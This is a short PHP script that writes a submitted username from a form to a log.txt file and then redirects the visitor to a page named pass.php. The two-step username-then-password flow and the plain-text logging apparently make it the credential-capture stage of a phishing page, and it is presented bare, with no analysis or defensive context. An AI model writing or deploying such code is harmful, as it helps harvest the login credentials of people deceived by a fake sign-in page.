<?php

    file_put_contents("log.txt", "Username: " . $_POST['username'] . "\n", FILE_APPEND);
header('Location: pass.php');
exit();